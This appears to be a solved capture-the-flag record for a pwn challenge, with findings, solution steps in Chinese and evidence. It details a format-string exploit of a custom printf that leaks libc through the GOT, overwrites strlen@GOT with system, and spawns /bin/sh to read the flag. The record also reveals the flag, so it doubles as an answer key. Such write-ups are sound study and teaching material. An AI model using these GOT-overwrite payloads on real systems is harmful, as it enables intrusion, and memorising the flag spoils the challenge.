challenge.name: Print Print Revolution
challenge.description: The arcade's score printer has been spitting out strange tickets all week. Step up to the renderer and see what it's really printing.

records.findings_summary: Flag found via Reverse-engineered the stripped binary's custom printf (0x401330) and abused its broken positional-argument handling: args N>=6 are read directly out of the attacker-controlled format buffer (arg N = qword at buf+8*(N-6)). Used %8$s to leak write@GOT -> libc base (Ubuntu 24.04 glibc 2.39 / libc6_2.39-0ubuntu8), then %8$w to overwrite strlen@GOT with system(), then %8$s pointing at the libc "/bin/sh" string to trigger system("/bin/sh") and read flag.txt.: sun{cust0m_fmtstr_n0_t00ls_4ll0wed} | Evidence: checksec: ELF64 EXEC (non-PIE), partial RELRO -> .got.plt (0x404000+) writable ; IDA/objdump of 0x401330: custom printf; '%w' handler does `mov [r8],rax` (arbitrary 8-byte write), '%s' handler calls strlen then write ; Empirical arg mapping: %6$p printed buffer[0:8], %8$p printed buffer[16:24] -> arg(N>=6)=qword at format_buf+8*(N-6) ; Remote leak of write@GOT=0x788ac296a560 -> base=0x788ac284e000; low-12 fingerprint (write 0x560/read 0xa50/setvbuf 0x540) matched libc6_2.39-0ubuntu8 via libc.rip (system=0x58740, str_bin_sh=0x1cb42f) ; Payload '%8$w'+pad+p64(0x404008)+p64(base+system) -> returned 'ok' (write primitive confirmed), then '%8$s' -> p64(base+0x1cb42f) spawned shell
solution_steps: file/readelf: revolution 是非 PIE 的 ELF64，partial RELRO，因此 0x404000+ 的 .got.plt 可写。
用 objdump/IDA 逆出 0x401330 处自实现的 printf：%s 调 strlen 后 write；%x/%p 打印寄存器/栈参数；%w 执行 `mov [r8],rax` 即任意地址写 8 字节。
实测参数解析：%6$p 等于 format 缓冲区偏移 0 处的 8 字节，%8$p 等于偏移 16，即第 N(N>=6) 个参数 = 格式串 buf+8*(N-6)，完全由输入控制。
构造 payload=b'%8$s'+填充到偏移16+p64(0x404000)，从远端泄漏 write@GOT=0x788ac296a560，得到 libc 基址 0x788ac284e000。
用低 12 位指纹(write 0x560/read 0xa50/setvbuf 0x540)经 libc.rip 匹配到 libc6_2.39-0ubuntu8，得 system=0x58740、/bin/sh=0x1cb42f。
构造 payload=b'%8$w'+填充+偏移16放 p64(0x404008)+偏移24放 p64(base+0x58740)，把 strlen@GOT 改成 system；返回 'ok' 确认写入成功。
构造 payload=b'%8$s'+填充+偏移16放 p64(base+0x1cb42f)，%s 分支内 strlen(ptr) 被替换为 system(ptr) 从而执行 system("/bin/sh")，拿到 shell。
在 shell 中 `cat flag.txt` 得到 sun{cust0m_fmtstr_n0_t00ls_4ll0wed}，提交平台返回 CORRECT。
evidence: checksec: ELF64 EXEC (non-PIE), partial RELRO -> .got.plt (0x404000+) writable
IDA/objdump of 0x401330: custom printf; '%w' handler does `mov [r8],rax` (arbitrary 8-byte write), '%s' handler calls strlen then write
Empirical arg mapping: %6$p printed buffer[0:8], %8$p printed buffer[16:24] -> arg(N>=6)=qword at format_buf+8*(N-6)

Remote leak of write@GOT=0x788ac296a560 -> base=0x788ac284e000; low-12 fingerprint (write 0x560/read 0xa50/setvbuf 0x540) matched libc6_2.39-0ubuntu8 via libc.rip (system=0x58740, str_bin_sh=0x1cb42f)
Payload '%8$w'+pad+p64(0x404008)+p64(base+system) -> returned 'ok' (write primitive confirmed), then '%8$s' -> p64(base+0x1cb42f) spawned shell
Shell output: uid=1337(revolution); cat flag.txt -> sun{cust0m_fmtstr_n0_t00ls_4ll0wed}
